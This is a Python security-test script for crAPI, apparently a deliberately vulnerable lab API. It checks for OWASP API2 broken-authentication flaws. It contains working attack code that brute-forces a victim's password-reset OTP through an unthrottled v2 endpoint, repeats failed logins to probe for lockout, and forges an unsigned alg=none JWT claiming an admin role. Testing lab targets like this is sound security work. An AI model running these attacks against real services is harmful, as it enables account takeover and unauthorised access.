#!/usr/bin/env python3
"""
OWASP API Security Top 10:2023 - API2: Broken Authentication
Target: crAPI running on Docker (default port 8888)

Tests for:
  - OTP brute-force on the v2 forgot-password endpoint (no rate limiting)
  - Weak/predictable OTP space (4-digit numeric = 10,000 combinations)
  - JWT token acceptance after password change
  - Login with common/weak passwords
"""

import requests
import time
import sys

from crapi_config import BASE_URL, USER1_EMAIL, USER1_PASSWORD, USER2_EMAIL, USER2_PASSWORD
ATTACKER_EMAIL = USER1_EMAIL
ATTACKER_PASSWORD = USER1_PASSWORD
VICTIM_EMAIL = USER2_EMAIL


# A real registered user whose password you want to try resetting

# Attacker-controlled account (already registered)


def get_token(email, password):
    r = requests.post(f"{BASE_URL}/identity/api/auth/login",
                      json={"email": email, "password": password})
    if r.status_code == 200:
        return r.json().get("token")
    return None


def test_otp_brute_force_no_rate_limit(email, max_attempts=50):
    """
    API2 Test: The v3 OTP endpoint rate-limits after ~3 attempts.
    The v2 endpoint has no rate limiting — brute-forceable.
    We demonstrate the vulnerability without completing a full 10,000-attempt attack.
    """
    print(f"\n[API2:BrokenAuth] OTP Brute-Force via Downgraded Endpoint")
    print(f"  Victim email: {email}")

    # Step 1: Trigger OTP generation
    r = requests.post(f"{BASE_URL}/identity/api/auth/forget-password",
                      json={"email": email})
    print(f"  Trigger OTP (forget-password): HTTP {r.status_code}")
    if r.status_code not in (200, 201):
        print(f"  [WARN] Could not trigger OTP. Response: {r.text[:200]}")
        return False

    # Step 2: Probe v3 endpoint to confirm rate limiting exists
    print(f"\n  Probing v3 endpoint rate-limiting...")
    hit_limit_v3 = False
    for otp in range(1000, 1010):
        r3 = requests.post(f"{BASE_URL}/identity/api/auth/v3/check-otp",
                           json={"email": email, "otp": str(otp), "password": "NewPass!99"})
        print(f"    v3 OTP {otp} → HTTP {r3.status_code}")
        if r3.status_code == 500 or "limit" in r3.text.lower():
            hit_limit_v3 = True
            print(f"    [RATE LIMIT HIT] v3 endpoint is protected after limited attempts")
            break

    # Step 3: Probe v2 endpoint — same OTP range, no rate limiting
    print(f"\n  Probing v2 endpoint (should have NO rate limiting)...")

    # Re-trigger OTP since v3 might have invalidated it
    requests.post(f"{BASE_URL}/identity/api/auth/forget-password", json={"email": email})
    time.sleep(0.5)

    hit_limit_v2 = False
    attempts_v2 = 0
    for otp in range(1000, 1000 + max_attempts):
        r2 = requests.post(f"{BASE_URL}/identity/api/auth/v2/check-otp",
                           json={"email": email, "otp": str(otp), "password": "NewPass!99"})
        attempts_v2 += 1
        status = r2.status_code
        print(f"    v2 OTP {otp} → HTTP {status}", end="")
        if status == 200:
            print(f" [SUCCESS - ACCOUNT COMPROMISED! OTP={otp}]")
            return True
        elif status == 500 or "limit" in r2.text.lower():
            hit_limit_v2 = True
            print(f" [RATE LIMIT - v2 is protected on this version]")
            break
        else:
            print()
        time.sleep(0.05)

    if not hit_limit_v2:
        print(f"\n  [VULNERABLE] v2 endpoint accepted {attempts_v2} attempts with NO rate limit!")
        print(f"  [INFO] Full attack would try 10,000 combinations (0000-9999)")
        print(f"  [INFO] At 50ms/req = ~8 minutes to exhaust full OTP space")
        return True
    else:
        print(f"\n  [PROTECTED] v2 endpoint also rate-limited on this deployment")
        return False


def test_jwt_algorithm_confusion():
    """
    API2 Test: Check if 'none' algorithm or weak secrets are accepted.
    Sends a JWT with alg=none to see if server accepts it.
    """
    import base64

    print(f"\n[API2:BrokenAuth] JWT Algorithm Confusion (alg=none)")

    # Craft a fake JWT with alg: none
    header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        b'{"sub":"attacker@evil.com","role":"admin","iat":9999999999}'
    ).rstrip(b"=").decode()
    fake_jwt = f"{header}.{payload}."

    headers = {"Authorization": f"Bearer {fake_jwt}"}
    r = requests.get(f"{BASE_URL}/identity/api/v2/user/dashboard", headers=headers)
    print(f"  alg=none JWT → HTTP {r.status_code}")
    if r.status_code == 200:
        print(f"  [VULNERABLE] Server accepted unsigned JWT!")
        return True
    else:
        print(f"  [PROTECTED] Server rejected unsigned JWT (HTTP {r.status_code})")
        return False


def test_login_no_lockout():
    """
    API2 Test: Is there account lockout or rate limiting on login?
    """
    print(f"\n[API2:BrokenAuth] Login Endpoint - Rate Limit / Lockout Check")
    url = f"{BASE_URL}/identity/api/auth/login"
    payload = {"email": VICTIM_EMAIL, "password": "wrongpassword"}
    blocked = False
    for i in range(1, 16):
        r = requests.post(url, json=payload)
        print(f"  Attempt {i:02d} → HTTP {r.status_code}", end="")
        if r.status_code == 429 or "lock" in r.text.lower() or "too many" in r.text.lower():
            blocked = True
            print(f" [RATE LIMITED]")
            break
        else:
            print()
        time.sleep(0.1)
    if not blocked:
        print(f"  [VULNERABLE] No lockout after 15 failed login attempts!")
        return True
    else:
        print(f"  [PROTECTED] Lockout/rate-limiting detected")
        return False


def test_valid_login():
    """Sanity check: confirm auth works at all."""
    print(f"\n[API2:BrokenAuth] Sanity Check - Valid Login")
    token = get_token(ATTACKER_EMAIL, ATTACKER_PASSWORD)
    if token:
        print(f"  [OK] Login successful, JWT received: {token[:40]}...")
        return True
    else:
        print(f"  [ERROR] Could not log in with known credentials")
        return False


def main():
    print("=" * 60)
    print("  crAPI - API2: Broken Authentication")
    print("=" * 60)
    print(f"\nTarget: {BASE_URL}")

    results = []
    results.append(("Valid Login Sanity Check",          test_valid_login()))
    results.append(("Login Endpoint No Lockout",         test_login_no_lockout()))
    results.append(("OTP Brute-Force (v2 no rate limit)",test_otp_brute_force_no_rate_limit(VICTIM_EMAIL)))
    results.append(("JWT alg=none Confusion",            test_jwt_algorithm_confusion()))

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for name, vuln in results:
        status = "VULNERABLE ⚠️ " if vuln else "PROTECTED  ✅"
        print(f"  {status}  {name}")
    print()


if __name__ == "__main__":
    main()
